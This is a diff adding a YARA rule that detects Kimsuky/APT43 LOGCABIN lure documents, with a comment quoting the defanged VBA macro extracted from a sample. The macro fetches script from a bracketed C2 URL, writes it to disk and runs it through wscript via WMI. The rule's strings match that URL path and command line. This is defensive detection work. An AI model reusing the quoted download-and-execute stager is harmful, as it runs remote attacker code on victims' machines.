@@ -1,0 +1,42 @@
+/* Extracted VBA. Defanged.
+
+    Documents.Add
+    hs = "On Error Resume Next:Set mx = CreateObject(""Microsoft.XMLHTTP""):mx.open ""GET"", ""http://xxx/list.php?query=1"", False:mx.Send:Execute(mx.responseText)"
+    ui = "bipaf[.]org/bbs/zipcode/auth/a4b5e82/586f0a"
+    hs = Replace(hs, "xxx", ui)
+    rp = resp & "\1589989024.xml"
+    ActiveDocument.Range.Text = hs
+    ActiveDocument.SaveAs rp, wdFormatText
+    ActiveDocument.Close
+    Set wmObj = GetObject("winmgmts:win32_process")
+    wmObj.Create "wscript.exe //e:vbscript //b " & rp
+
+*/
+	
+rule Mal_DPRK_Kimsuky_LOGCABIN {
+
+	meta:
+	    Author = "John Doyle"
+        Description = "Lure doc used by APT43/Kimsuky as part of the LOGCABIN family containing VBA code with basic C2 string splitting'"
+        Description = "Searches for unique elements in the URL path structure"
+        Hash = "138918740031ac6317c0bb02e2b17be8aaa694293b94fba810c7a27764af5465"
+        Reference = "https://twitter.com/anonysecagency/status/1429776263963684870"
+	
+	strings:
+	
+	$http_type = "GET"
+	
+	$url_path1 = "bbs"
+	$url_path2 = "zipcode"
+	$url_path3 = "xxx"
+	$url_path4 = {52 65 70 6c 61 63 65 ??}  
+	// Replace(
+	
+	$host_command1 = {77 73 63 72 69 70 74 2e 65 78 65 20 2f 2f 65 3a 76 62 73 63 72 69 70 74 20 2f 2f 62} 
+	// "wscript.exe //e:vbscript //b"
+
+	condition:
+	
+	$http_type and $host_command1 and 2 of ($url_path*) 
+	
+}
